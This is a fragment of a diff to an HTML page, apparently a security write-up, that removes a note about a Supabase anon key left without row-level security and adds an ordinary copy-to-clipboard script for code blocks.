-                    <br><span class="tag-label">Security features insufficient:</span> The anon key exists (Supabase provides it) but is paired with zero RLS policies, making it equivalent to a public read/write API.
-                </div>
-            </div>
-        </div>
-
     </section>
 
     <section id="education">
@@ -1054,6 +1124,16 @@ window.addEventListener('scroll', () => {
     nav.classList.toggle('scrolled', window.scrollY > 10);
 }, { passive: true });
 
+// Copy buttons on code blocks
+document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        const code = btn.nextElementSibling.textContent;
+        navigator.clipboard.writeText(code).then(() => {
+            btn.textContent = 'Copied!';
+            setTimeout(() => btn.textContent = 'Copy', 1500);
+        });
+    });
+});
 </script>
 
 </body>
